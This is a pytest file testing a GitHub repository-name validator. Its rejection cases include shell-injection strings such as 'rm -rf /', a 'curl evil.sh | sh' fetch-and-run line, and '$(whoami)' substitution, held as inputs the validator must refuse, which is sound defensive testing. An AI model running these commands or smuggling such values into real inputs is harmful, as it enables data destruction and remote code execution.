import pytest

from pipeline.repo_name import is_valid_repo, validate_repo


@pytest.mark.parametrize("repo", [
    "langchain-ai/langchain", "facebook/react", "a/b", "user123/my.repo_name-2",
    "x/.github", "o/" + "n" * 100, "o" * 39 + "/r",
])
def test_accepts_real_github_names(repo):
    assert is_valid_repo(repo)


@pytest.mark.parametrize("repo", [
    # shell injection attempts that the old "one slash" check let through
    "a/b;rm -rf /", "a/b && curl evil.sh | sh", "a/$(whoami)", "a/`id`",
    "a/b c", "a/b\nrm", "a/b'", 'a/b"', "a/b|x", "a/b>f",
    # structurally invalid
    "", "a", "a/", "/b", "a/b/c", "-a/b", "a/.", "a/..", "o" * 40 + "/r",
    "o/" + "n" * 101, None, 123,
])
def test_rejects_injection_and_malformed(repo):
    assert not is_valid_repo(repo)


def test_validate_repo_strips_whitespace_and_raises():
    assert validate_repo("  facebook/react ") == "facebook/react"
    with pytest.raises(ValueError):
        validate_repo("a/b;id")
